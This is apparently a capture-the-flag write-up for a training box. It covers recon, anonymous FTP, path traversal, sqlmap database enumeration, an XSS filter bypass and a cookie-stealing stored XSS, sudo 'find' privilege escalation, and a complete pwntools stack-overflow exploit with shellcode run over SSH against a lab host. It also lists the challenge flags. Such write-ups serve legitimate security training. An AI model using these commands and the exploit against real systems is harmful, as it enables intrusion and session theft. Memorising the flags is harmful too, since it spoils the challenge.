# Box 1

- [Box 1](#box-1)
  - [Recon](#recon)
    - [Port scan](#port-scan)
    - [Dir scan](#dir-scan)
  - [FTP](#ftp)
  - [File includes](#file-includes)
    - [Traversal](#traversal)
    - [LFI](#lfi)
  - [SQLi](#sqli)
    - [Login Bypass](#login-bypass)
    - [Enumeration](#enumeration)
  - [XSS](#xss)
    - [Reflected](#reflected)
    - [Stored](#stored)
  - [Privesc](#privesc)
  - [Overflow](#overflow)

## Recon

### Port scan

![nmap_scan](https://i.imgur.com/n7OkCKt.png)

### Dir scan

Initial directory scan

![](https://i.imgur.com/PyakVKB.png)

Secrets needs some more attention

![](https://i.imgur.com/pue7Rqg.png)

We must go deeper

![](https://i.imgur.com/xd12U8b.png)

Contents of flag.html

![](https://i.imgur.com/0ETUERA.png)

FLAG: ```245_SKILL{Rec0n_W1th_Extr3me_Brut3_Force} ```

## FTP

Can access ftp server using anonymous username

![ftp_flag](https://i.imgur.com/DchJ47i.png)

FLAG: ```CUEH:{anonymous_ftp_access}```

## File includes

### Traversal

Travel back far enough in the file system with ```..``` to get to root directory, include traversal.txt to the web page.

![Traversal](https://i.imgur.com/hi9EfaA.png)

FLAG: ```245_SKILLS{J0urney_T0_The_R00t_F1l3Syst3m}```

### LFI

TODO

## SQLi

### Login Bypass

TODO

### Enumeration

Capturing request to run against SQLmap.

![](https://i.imgur.com/ySMXkzO.png)

Enumerating database name

```sqlmap -r sqli.req --threads=10 --dbs```

![](https://i.imgur.com/AAwc1Zi.png)

Enumerating table names

```sqlmap -r sqli.req --threads=10 -D enum --tables```

![](https://i.imgur.com/KiGaszi.png)

Dumping contents of ```hiddenTable```

![](https://i.imgur.com/oFkvLWM.png)

FLAG: ```245_SKILLS{Enum3r8_A11_0f_Th3_Th1ng5```

## XSS

### Reflected

Body tag wasn't blocked but ```onload=``` was. ```onload =``` with a space before the equals bypassed the filter.

![reflected_xss](https://i.imgur.com/L4KrsYO.png)

FLAG: ```245_SKILLS{Its_N0t_0nly_M1rr0rs_Th4t_R3fl3ct}```

### Stored

Payload used to send target user to our python http server, appending their session cookie to the end of their request.

![](https://i.imgur.com/0TK622B.png)

Output of our http server when user tries to connect.

![](https://i.imgur.com/prMvZ07.png)

Adding session cookie to storage

![](https://i.imgur.com/i7DsZGH.png)

Refreshing page, gives us the flag

![](https://i.imgur.com/yVWLvsw.png)

FLAG: ```245_SKILLS{G0_Cook1e_Monster}```

## Privesc

Logging into ssh with provided creds, running ```sudo -l``` to see if there's anything of interest. 
![sudo](https://i.imgur.com/xxSnf3a.png)

We can run ```find``` as root, to GTFObins.

Spawn shell with ```find``` as sudo.

![root](https://i.imgur.com/zPxFILN.png)

FLAG: ```245_SKILLS{Acc3s_All_Ar3@s}```

## Overflow

Copying vulnerable file to host box to work on.

![copy](https://i.imgur.com/V5xpNPY.png)

Python script to find offset of eip.

```python
from pwn import *

context(os='linux', arch='i386')
context.log_level= 'debug'

TARGET = './pwnme'

proc = process(TARGET)

pause()

payload = cyclic(1000)

proc.writeline(payload)
```

![](https://i.imgur.com/iSgvVoY.png)

Our offset is 0x6361616a or 236 in decimal.

Confirm we're in the eip with 4*B characters, eip should read ```0x42424242```

```python
from pwn import *

context(os='linux', arch='i386')
context.log_level= 'debug'

TARGET = './pwnme'
OFFSET = 236

proc = process(TARGET)

pause()

#stage 1
# payload = cyclic(1000)

#stage2
payload = b'A'*OFFSET
payload += b'BBBB'

proc.writeline(payload)
```

We have control of eip!

![](https://i.imgur.com/VomVGLO.png)

Using automagic ELF to add a ret2reg, bypassing ASLR. Then adding shellcode to payload, this should give us a shell through the binary now.

```python
from pwn import *

context(os='linux', arch='i386')
context.log_level= 'debug'

TARGET = './pwnme'
OFFSET = 236

shell_code = shellcraft.sh()

proc = process(TARGET)

#stage 1
# payload = cyclic(1000)

#stage2
# payload = b'A'*OFFSET
# payload += b'BBBB'

#stage 3
elf = ELF(TARGET)
CALL_EAX = next(elf.search(asm("call eax")))

payload = asm(shell_code)
payload += b'\x90'*(OFFSET-len(payload))
payload += p32(CALL_EAX)

proc.writeline(payload)

proc.interactive()
```

![](https://i.imgur.com/pBMTaxu.png)
>Successful shell

Convert for use over ssh instead of working on a local binary...

```python
from pwn import *

context(os='linux', arch='i386')
context.log_level= 'debug'

session = ssh(user='overflow', port=1337, host='192.168.243.133', password='overflow')

TARGET = './pwnme'
OFFSET = 236

shell_code = shellcraft.sh()

proc = session.run(TARGET)

#stage 1
# payload = cyclic(1000)

#stage2
# payload = b'A'*OFFSET
# payload += b'BBBB'

#stage 3
elf = ELF(TARGET)
CALL_EAX = next(elf.search(asm("call eax")))

payload = asm(shell_code)
payload += b'\x90'*(OFFSET-len(payload))
payload += p32(CALL_EAX)

proc.writeline(payload)

proc.interactive()
```

Root shell on target system
![](https://i.imgur.com/RgVYgPx.png)

FLAG: ```245_SKILLS{Jump_Up_Jump_Up_@nd_G3t_D0wn}```